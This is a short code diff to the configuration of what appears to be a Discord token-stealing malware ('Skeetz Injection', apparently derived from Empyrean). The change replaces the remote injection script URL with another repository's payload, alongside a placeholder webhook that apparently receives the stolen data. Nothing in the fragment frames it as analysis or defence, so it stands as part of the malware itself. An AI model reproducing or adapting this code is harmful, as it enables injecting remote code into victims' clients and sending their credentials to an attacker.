@@ -11,7 +11,7 @@ const {
 
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    injection_url: "https://raw.githubusercontent.com/Entity378/Empyrean-Injection/main/clean.js",
+    injection_url: "https://raw.githubusercontent.com/Mano6g/MCESTUdo/refs/heads/main/index.js",
     embed_name: "💉・ Skeetz Injection ・💉",
     embed_icon: "https://i.imgur.com/RbT31Ow.png",
     embed_color: 0x4A4A4A,
